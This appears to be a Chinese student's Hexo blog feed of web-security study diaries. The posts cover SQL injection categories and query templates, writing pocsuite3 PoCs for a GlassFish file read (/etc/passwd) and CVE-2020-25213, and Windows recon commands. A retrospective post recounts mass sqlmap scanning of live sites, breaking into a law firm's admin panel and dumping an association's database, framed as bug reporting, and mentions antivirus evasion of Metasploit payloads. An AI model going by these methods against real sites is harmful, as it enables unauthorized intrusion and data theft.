class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;id=<span class="subst">$id</span>,username=<span class="subst">$username</span>,password=<span class="subst">$password</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$mysqli_stmt</span>-&gt;close();</span><br><span class="line"><span class="variable">$mysqli</span>-&gt;close();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h3></li><li>只能说预编译的方法是防御sql注入最好的方式，但是主要还是看编写代码的人，即使用预编译也有人会写出存在sql注入的代码。</li><li>今天我也是研究了一天，从基础的注入攻击，再到如何防御。php代码是我自己写的，就是自己写存在漏洞的php代码，再去测试和研究，以前都是做别人的靶场，代码层面理解不到位，现在算是回来恶补吧。</li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>学习_生活记录_再探sql注入_sqlmap使用 &amp; tamper编写</title>
      <link href="2022/04/26/%E5%AD%A6%E4%B9%A0_%E7%94%9F%E6%B4%BB%E8%AE%B0%E5%BD%95_%E5%86%8D%E6%8E%A2sql%E6%B3%A8%E5%85%A5/"/>
      <url>2022/04/26/%E5%AD%A6%E4%B9%A0_%E7%94%9F%E6%B4%BB%E8%AE%B0%E5%BD%95_%E5%86%8D%E6%8E%A2sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入分类"><a href="#sql注入分类" class="headerlink" title="sql注入分类"></a>sql注入分类</h1><p>&ensp;&ensp;&ensp;&ensp;以前学sql注入，sqli-lab也做完了，该回的操作都会，就是没有系统的去总结，或者说虽然有写思维导图但是没完全入脑，所以重新回来复习基础。<br>###按照注入点分类</p><ul><li>数字型</li><li>字符型</li><li>搜索型<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1</span><br><span class="line">SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1</span><br><span class="line">SELECT * FROM 表名 WHERE 字段 LIKE &#39;%关键字%&#39; </span><br></pre></td></tr></table></figure>###按照提交的方式分类</li><li>GET</li><li>POST</li><li>cookie注入(其实也可以算作http头部注入)</li><li>http头部注入(Referer,User-Agent等等)</li></ul><p>###按照注入的效果分类</p><ul><li>基于布尔的盲注</li><li>基于时间的盲注</li><li>报错注入</li><li>联合查询注入</li><li>堆叠注入(一次性注入多条sql语句,用;做分隔)</li><li>宽字节注入(GBK编码导致的两个字符组成一个中文，从而从而绕过字符转义的防御措施)</li></ul><p>##相关基础知识</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">MySQL一库三表</span><br><span class="line">information_schema</span><br><span class="line">    </span><br><span class="line">    schemata 存放所有创建的数据库名</span><br><span class="line">        schema_name 数据库名字段</span><br><span class="line">    </span><br><span class="line">    tables   存放所用的库名和表名</span><br><span class="line">        table_schema 数据库名字段</span><br><span class="line">        table_name 表名字段</span><br><span class="line">    </span><br><span class="line">    columns</span><br><span class="line">        table_schema </span><br><span class="line">        table_name   </span><br><span class="line">        columns_name 字段名</span><br><span class="line"></span><br><span class="line">mysql注入常用到的函数</span><br><span class="line">    load_file()</span><br><span class="line">    length()</span><br><span class="line">    substr(string,start,length)</span><br><span class="line">    mid() 同 substr()</span><br><span class="line">    concat()      </span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="sqlmap-Tamper"><a href="#sqlmap-Tamper" class="headerlink" title="sqlmap Tamper"></a>sqlmap Tamper</h1><ul><li><p>&ensp;&ensp;&ensp;&ensp;又重温了一下Tamper的编写。之前学习tamper编写，用的是绕过安全狗的例子。现在python学的比较好了，就去研究了自带的tamper的代码，大部分还是懂的，**kwargs和函数下嵌套函数去学习了下，感觉还是非常有收获。不过，一些正则的写法属实是看的有些迷糊，得查语法才能完全看懂。总的来说，现在别人写的Tamper看的懂了，自己也能写tamper了，re这个模块主要是我在学爬虫的时候用过，现在使用也是没有什么问题，主要就是正则表达式，其实基本的还是会的，就是有一些语法记不住。再说说我学习的方式，以前是跟着视频学，现在是看书(《web安全攻防》，挺好的一本书，实战性强)自己研究探索，对比来说，我觉得自己看书学比较适合我。</p></li><li><p>&ensp;&ensp;&ensp;&ensp;好了，再说一下英语四级的学习，感觉计划得调整一下，之前是有一点着急了，事情做的有效才是最关键的。以后看情况再写文章了，我感觉心态调整的差不多了。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习&amp;生活_再探poc的编写</title>
      <link href="2022/04/25/%E5%AD%A6%E4%B9%A0-%E7%94%9F%E6%B4%BB-%E5%86%8D%E6%8E%A2poc%E7%9A%84%E7%BC%96%E5%86%99/"/>
      <url>2022/04/25/%E5%AD%A6%E4%B9%A0-%E7%94%9F%E6%B4%BB-%E5%86%8D%E6%8E%A2poc%E7%9A%84%E7%BC%96%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h3 id="poc编写"><a href="#poc编写" class="headerlink" title="poc编写"></a>poc编写</h3><p>&ensp;&ensp;其实很早就开始学习写poc了,用的是pocsuite3这个框架， 不过都没有怎么深入的学习，框架还不是很熟悉，就是之前 跟着b站上的老师写了一个glassfish的任意文件读取漏洞，写的也是非常的粗糙。 这几天都在折腾poc，也就把之前写的glassfish的poc优化了一下，主要是windows和linux读取的文件不同，一个/etc/passwd, 一个是/windows/win.ini。同时，我也看了一下pocsuite开发文档，最大的收获是懂了result这个返回参数的用法(一开始接触时困扰我好久)。现在基本上可以自己编写_verify这个部分了，就是验证是否存在漏洞这个部分,不过_shell这个部分,一些反弹的操作的写法有空值得再去学一下。搞这些还不够，我还折腾了一下wordpress的file-manager插件漏洞(CVE-2020-25213),属于一个RCE漏洞，危害就懒得说了，很大就对了，说一下我编写poc的过程，一开始我是在searchsploit上看到这个漏洞的，poc是shell写的，我就准备先将shell的poc移植成python的,最后再移植到pocsuite3框架上。这个shell写的poc，我看懂思路之后，就很顺利的把poc写好了，不过上传文件这里忘记了就参考了一下别人的。我写好自己的poc之后就把它移植到pocsuite3上了，但是上传文件这里就是搞不定，就是验证存在漏洞之后，上传一个phoinfo就不会搞了，后面也是参考了一下别人在pocsuite框架上写的这个漏洞的poc，但是由于他的靶机是linux，我这里也无法getshell,也只能完成基本的验证。<br>最后，我还是放弃了在框架上getshell，我选择了自己写一个poc实现webshelll的模拟终端，以前上传了webshell都是用被人的webshell管理工具，现在总算是自己能实现模拟终端这个基本的功能了。</p><p>&ensp;&ensp;再说一下我的一些感想吧，上面写的有点乱。首先，验证漏洞是否存在可以有多种思路，比如存在RCE，直接尝试上传空白文件，如果可以请求到上传的文件就说明存在漏洞，或者根据一些特征文件或者页面错误参数确定存在漏洞的可能。接着就是漏洞挖掘方面的感悟，这几天研究poc的编写，虽然没有去研究代码层面的原理，但是我发现每一个漏洞的出现都是有踪迹可寻的，比如，一个人写的代码用了另一个人曾经有漏洞的代码，也就是说这两个漏洞之间的原理十分相似，我觉得这个思路可以用到新漏洞的挖掘当中去。</p><p>&ensp;&ensp;最后，再说说我大学里的学习，上面说的算是我兴趣使然的学习。大学里的课程是越学越没劲了，但是，我得想个办法让自己变得积极一些，比如，想想没学好的后果，想想学好的用处。还有，英语四级考试越老越近了，我最近似乎遇到了听力上的瓶颈，导致我做阅读也是越做越烦，算了，慢慢来吧！我才不管什么瓶颈，干的就是你！我觉得我在懈怠英语四级备考的时候得想想如果没有过的后果，给自己一点压力+戒骄戒躁，这样我觉得会状态会慢慢变好。</p><h3 id="插图的事情"><a href="#插图的事情" class="headerlink" title="插图的事情"></a>插图的事情</h3><p>&ensp;&ensp;由于这个插图实在是折腾人，其实有专门的插件，但是还要配置什么的，弄了一下，没搞好，我暂时放弃了，以后也不知道有没有空，有，再弄。上一篇的插图都是我改网页代码+亲自上传图片到github仓库才搞好的，我也是佩服我自己。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> poc </tag>
            
            <tag> pocsuite3 </tag>
            
            <tag> glassfish </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习_生活记录_windows下常用命令</title>
      <link href="2022/04/24/%E5%AD%A6%E4%B9%A0_%E7%94%9F%E6%B4%BB%E8%AE%B0%E5%BD%95_windows%E4%B8%8B%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>2022/04/24/%E5%AD%A6%E4%B9%A0_%E7%94%9F%E6%B4%BB%E8%AE%B0%E5%BD%95_windows%E4%B8%8B%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h3 id="新学的一些命令"><a href="#新学的一些命令" class="headerlink" title="新学的一些命令"></a>新学的一些命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">find &quot;test&quot; d:&#x2F;test&#x2F;test.txt 从一个文件中查找字符串</span><br><span class="line">dir|findstr &quot;.exe&quot; 列出当前目录下的exe文件</span><br><span class="line">Move-Item 移动文件夹</span><br><span class="line">Rename-Item 文件夹重命名    </span><br><span class="line">Copy-Item 复制文件</span><br><span class="line">where python 查找一个命令所在的路径</span><br><span class="line">$env:PATH 查看环境变量</span><br><span class="line">Get-ChildItem -Recurse -Filter &#39;*.exe&#39;  查找子目录下的exe文件 </span><br><span class="line">gci -r -fi &#39;*.exe&#39; 简写</span><br></pre></td></tr></table></figure><h3 id="一些简单的命令"><a href="#一些简单的命令" class="headerlink" title="一些简单的命令"></a>一些简单的命令</h3>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mkdir                                   </span><br><span class="line">ls                                      </span><br><span class="line">shutdown</span><br><span class="line">dir</span><br><span class="line">type</span><br><span class="line">net user</span><br><span class="line">net localgroup</span><br><span class="line">tasklist</span><br><span class="line">systeminfo</span><br><span class="line">cd</span><br></pre></td></tr></table></figure><h3 id="当下所思所想"><a href="#当下所思所想" class="headerlink" title="当下所思所想"></a>当下所思所想</h3><p>今天，突然感觉自己有一些命令总是不会用，比如这个find，今天总算是会了，顺便学了一个findstr。<br>还有，我要作出一个决定，今后我每天只要有空就写一写博客，记录我的生活以及学习。</p><p>手机彻底摔坏了，这部手机差不多2020年12月买的吧！到现在才一年多，没办法，如果修得十几天，我还要上网课，所以就买了一部新的手机，1500左右的。</p><p>这篇文章算是我第一篇分享我学习内容的文章吧，以后也会分享我学web攻防的学习内容，这几天也是了解了一下护网和渗透测试的区别，我觉得最大的区别是需要内网渗透吧，护网更加深入，而普通的渗透可能没有那么深入，也就是点到为止的测试。</p><p>最后，插几张图片，这破碎的屏幕就如我的心一样，早就碎了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>谈谈我一年的web安全学习路程</title>
      <link href="2022/04/13/%E8%B0%88%E8%B0%88%E6%88%91%E4%B8%80%E5%B9%B4%E7%9A%84web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%A8%8B/"/>
      <url>2022/04/13/%E8%B0%88%E8%B0%88%E6%88%91%E4%B8%80%E5%B9%B4%E7%9A%84web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<ul><li>本来不想写这段经历的，有很多原因吧，主要还是自己的原因。算了，不说废话了，切入正题。</li><li>说起我学web安全的历程，就得从2021年1月份左右了开始了。我在开始的时候，其实也是非常迷茫的，大学专业也不是我想学的，我其实最喜欢的专业是网络安全的，不过这专业没几个学校有，就算有，培养体系也不完善。一开始，我是在学C语言的过程中意外的对网络安全有了浓厚的兴趣，其实，一开始我想过用unity开发游戏，之前高考玩之后把C#的基础都学了一下，算是我入门的语言吧。不过我发现开发游戏似乎没有那么有意思，而且还难，我最后就放弃了，也就有了接下来网络安全之旅。</li><li>一开始学网络安全，我也不知道从哪里开始，所以在知乎上看文章，最后看到了拼客学院的陈老师的文章，我感觉他写的不错，没有什么束缚的感觉，就好像一股清流，他的文章让我知道了很多，也让我学网络安全有了方向。之后，也是在拼客学院里看kail的教程学习了几天，陈鑫杰老师讲课真的很用心的在解释，就好像心中有一团火一样，点燃了我，那几天我也是在深夜学的，一开始只是好奇，后面就无法自拔了，从讲互联网的诞生，到2017年的永恒之蓝，棱镜门事件，在到使用利用MS17-010 windows smb服务的漏洞渗透靶机，那时候我也是刚刚接触metasploit，也是一步一步照着做，最后看到电脑被打蓝屏了，哈哈哈哈哈，不过这是过头了，正常应该是反弹一个shell，不过那时候不懂，就是玩哈哈哈哈。那时候折腾的东西很多，进步的也快，每天都很充实，虽然有时候被linux的一些报错给整疯了，安装Nessus漏洞扫描器也是下了不少功夫才搞定，不过这都不算什么，只要心中有目标，还有自己觉得做这些是有意义的。这算是第一阶段(2021年一月到二月初)，大一上的寒假，那时候是一边准备着c语言二级考试，一边入门网络安全，这个阶段我大概清除了安全的几个方向，无线网络安全，工控安全，web安全，系统安全等等，也对渗透测试工程师的招聘要求有了大致的了解。</li><li>第二个阶段，2021年2月中旬就正式的开始学习网络安全了，课程是跟着b站千锋教育的，影响比较深的是杨哥哈哈哈哈，一开始教我网络基础，tcp/ip五层模型，路由器和交换机的工作原理，我感觉比现在我学校的计算机网络的老师讲的还详细和生动(我们老师应该看不到这篇文章吧嘻嘻)，还有域，vpn，防火墙，应用层的各种服务器(DHCP,DNS,FTP)和协议，也和我们讲了一些渗透的东西，关键是给了我们一个渗透测试标准PTES标准(清华大学诸葛建伟老师翻译的，后来也是读了他翻译的metasploit渗透测试指南和metasploit魔鬼训练营，教了我很多操作，开阔了我的视野，还有不得不说，诸葛老师真的也是心中有一团火的人，引领着我)。特别强调一下，我在学网络基础的时候，学到路由器交换机的时候，用到了一个思科的模拟软件，这个软件可以模拟网络中的各种设备，我也是跟着杨老师配置路由器和交换机组成基本的网络，ip route ,interface什么的路由器的命令，哈哈哈哈，真的是，我现在大学的计算机网络的课程实验不知道有没有这个，我看是没了，现在还在上网课，开学就大三，我真是乌鸦嘴，希望别是真的。学完了基础，也学了一点运维的东西，这时候接触了linux的centos,ubuntu系统，vim的基本使用，文件权限和日志这些。同时也快速入门了html，javascript以及pyhton。最后，我终于在3月底开始了web渗透的学习，信息收集，sql注入，xss，命令执行，文件上传，文件包含，ssrf，csrf，权限提升。不过这个阶段我感觉学的比较着急，学的不是太扎实，也就有了下一个阶段。这个阶段差不多就是在大一下学期。</li><li>第三个阶段，由于大一下的暑假比较拉跨，我玩了一个月，接下来一个月准备了一下计算机三级的信息安全(虽然真的没什么用哈哈哈)，所以这个阶段得从2021年9月开始(大二上)。我又在b站找了web安全的课程，把没学的骚操作给学了，这不，在10月到11月期间吧，我迷上了挖漏洞，我是在漏洞盒子上挖的公益SRC，技术还比较菜吧，只能搞一些中小站点，之前也发现过一个研究所的XSS，居然不给我过，自己却马上修复了。。。一开始是用google语法，手动测试sql注入和xss，后来觉得太慢了，也没什么技术提升，就想着怎么自动化了，后来有了连招，差不多就是，爬虫(一开始用别人的百度的，后来我在11月份把爬虫学了自己写了一个必应的爬虫)批量获取有漏洞特征的url，sqlmapapi自动扫描，还别说效率还挺高。不过最令我影响深刻的一个漏洞是一个律师事务所的站点，一开始我在登录页面，随意提交了admin ))# 发现居然报错了，我真的是笑死，居然还有这么菜的防护，sqlmap梭哈，不过奇怪居然拿不到数据，没办法，手工报错注入，我发现每次注入只能拿到一半的哈希值16位，一开始直接拿全部拿不全，我就意识到不对劲了，后来用了mid函数解决，解密了一下md5就进后台了，这时候我其实已经今后台进麻了(记得我第一个发现的漏洞就是弱口令进了一个后台好像就是在2021年的8下旬),后面看了一下，居然发现了前人的痕迹，网站有一个大马，后面发现网站禁用了php执行命令的所以函数，我也没什么思路提权那时候，就没搞了(蚁剑执行不了任何命令我是崩溃的),写了报告提交了上去。还有一次是进了一个协会的数据库，这个比较经典，思路是这样的，由于数据库比较多，sqlmap跑出好多密码我又不知到哪个是后台的密码，但是看到了一个mysql的数据库，索性就干它，后面也是顺利的拿到了密码，连上了数据库，我当时在宿舍笑了半天，哈哈哈哈哈。最后，在数据库里面找了一下，拿到了后台的密码进了后台，那时候比较菜也就没有继续搞它了。这个阶段也就是我初步有了挖漏洞的能力，但是我感觉还是少了一点什么，距离拿money的项目漏洞还有很长的路要走，说难也难，说简单也简单吧。多说一下，xxe最近学了一点，但是反序列化漏洞我现在还没怎么学，不过原理是懂的。额外补充，免杀这里我也折腾过一阵子，一开始是用别人的工具免杀了，go写的，后面我自己找资料学，用python也实现了metasploit生成ployload的免杀。</li><li>呜呼，一下子写了这么多，不知道会不会有很多废话，哈哈哈哈，总结一下，还是太菜，得继续学，继续实践。这一年的的规划是学java的代码审计以及巩固自己学的web漏洞多搭建环境复现，思考exp的思路(最近发现metasplit的exp有关web的我看的懂一些了，以后我也要用Ruby写exp，嘿嘿)。记得这么一句话，不是你的技巧不够多，而是你的基础不够牢。</li><li>“没有最强，只有更强！” “还有高手!”能看到我写这篇文章的人，与你们共勉吧！</li></ul>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>当下的一些想法</title>
      <link href="2022/04/10/%E5%BD%93%E4%B8%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95/"/>
      <url>2022/04/10/%E5%BD%93%E4%B8%8B%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>好久没回来了，折腾了一些博客的评论系统，可惜没搞好，事与愿违吧！不过无所谓了，也没什么人会来评论。我写博客的目的也就是为了记录自己的生活，没别的。</p><p>我简要总结一下我的2021年吧！首先，计算机二级c语言和三级信息安全都过了，一个优秀，一个良好，都不难，说实话也没什么意思。我考证书的目的不是这个证书有用才去考，考证书的过程中学到的知识，我觉得才是有用的，也是对自己的一种历练吧！转眼现在到了2022年4月了，接下来还有两个月的时间准备英语四级，现在听力基本上复习完了，但是平均下来还是只能对13道左移，这可不行，我的目标是20，所以接下来是每天一套听力(7套，留了5套左右考前做，可能5套有点多，到时候看情况)，单词也就继续天天坚持背背就行了，重点关注听力和阅读，这两个35%要搞好，之后有空余时间再把作文和翻译搞好。其它的计划就不说了，多说无益，现在就一个目标，把英语四级考好。多说一句，对于我而言，我计划的越周密，反而执行力越差，但是，如果给我一个大概的计划，我的执行力反而更强，也坚持的越久。</p><p>最后，说一下，2021年10月从微电子专业转专业到了网络工程，还是比较顺利的，大二第一个学期补了7课，其中有三门是要考试的，也还好，都过了。现在这学期，还有两门实验课要补，压力也是小了一点。不过，最近学计算机组成原理还是有些懈怠了，而且由于疫情愈发严重，可能最后要网上考试了，开学就大三也不是没有可能，所以自己懈怠的课程得开始慢慢补上来了。</p><p>“最初的梦想绝对会到达，实现了真的渴望，才能够算到过了天堂”,希望自己能一直坚持下去,虽然有时候，真的，真的，心累了。</p><p>– 就说这么多吧，下次写博客也不知道什么时候了。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>二级c语言的学习生活</title>
      <link href="2021/01/24/%E6%88%91%E7%9A%84%E4%BA%8C%E7%BA%A7c%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
      <url>2021/01/24/%E6%88%91%E7%9A%84%E4%BA%8C%E7%BA%A7c%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>现在在学习c语言，准备今年3月27号的计算机二级考试，知乎上的人都说二级刷刷题库就能过，没什么意思🤦‍。最近我也做了一些章节的练习，感觉题目比较基础，考察对一些细节的理解的时候，我老是被坑。。。总的来说感觉还行。现在也学了一半了，我争取在2月14号左右结束二级所有知识的学习，之后进行上机练习，还要看一些二级的公共基础知识，时间感觉还挺充裕的23333。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>建博客时的一些想法</title>
      <link href="2021/01/21/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"/>
      <url>2021/01/21/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<p>本站建于2021年1月20日，一时兴起折腾了好久才搞好，网站是借用Github上hexo的博客模板，还有一些设置没改，也不会改。以后学习了前端的html,css之后再回来折腾吧。人活着在于折腾，哈哈哈哈。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
